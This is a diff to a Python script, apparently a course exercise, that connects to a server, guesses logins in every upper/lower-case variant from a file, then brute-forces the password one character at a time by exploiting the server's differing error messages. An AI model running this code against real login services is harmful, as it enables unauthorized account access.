@@ -1,13 +1,23 @@
 import socket
 import sys
 import itertools
+import json
+import string
 
 
-# find all the possible combinations of upper and lower case letters for each password
-def passwords(file):
-    for i in file:
+# find all the possible combinations of upper and lower case letters for each login provided in file
+def login(ids):
+    for i in ids:
         for x in map(lambda x: "".join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in i.strip("\n")))):
             yield x
+
+
+# iterates through all upper/lower letters and numbers
+def password_attempts():
+    to_try = string.ascii_letters + string.digits
+    while True:
+        for i in to_try:
+            yield i
 
 
 # takes command line argument and retrieves address and port for a server
@@ -19,18 +29,37 @@ address = (hostname, port)
 the_socket = socket.socket()
 the_socket.connect(address)
 response = ""
-# uses a dictionary of common passwords that are all numbers or lowercase letters
-file = open("passwords.txt", "r")
-password = passwords(file)
+# receives file of possible logins
+file = open("logins.txt", "r")
+logins = login(file)
+attempts = password_attempts()
+pswrd = password_attempts()
+# used to store correct login and password
+password = ""
+login = ""
 
-
-# sends passwords to the server and checks if the response is correct
+# sends login to the server and checks if the response is correct
 while True:
-    to_check = next(password)
-    the_socket.send(to_check.encode())
+    check_login = next(logins)
+    to_send = {"login": check_login, "password": ""}
+    the_socket.send(json.dumps(to_send).encode())
     response = the_socket.recv(1024)
-    if response.decode("utf-8") == "Connection success!":
-        print(to_check)
-        file.close()
-        the_socket.close()
+    if json.loads(response.decode("utf-8"))["result"] == "Wrong password!":
+        login = check_login
         break
+# if response from server is "Wrong password!" instead of "Wrong login!"
+# it continues on to brute force the password
+while True:
+    pass_attempt = next(pswrd)
+    to_send = {"login": login, "password": password + pass_attempt}
+    the_socket.send(json.dumps(to_send).encode())
+    response = the_socket.recv(1024)
+    # when successful print login and password in JSON
+    if json.loads(response.decode("utf-8"))["result"] == "Connection success!":
+        print(json.dumps(to_send))
+        break
+    # saves each correct char for the password
+    elif json.loads(response.decode("utf-8"))["result"] == "Exception happened during login":
+        password += pass_attempt
+file.close()
+the_socket.close()
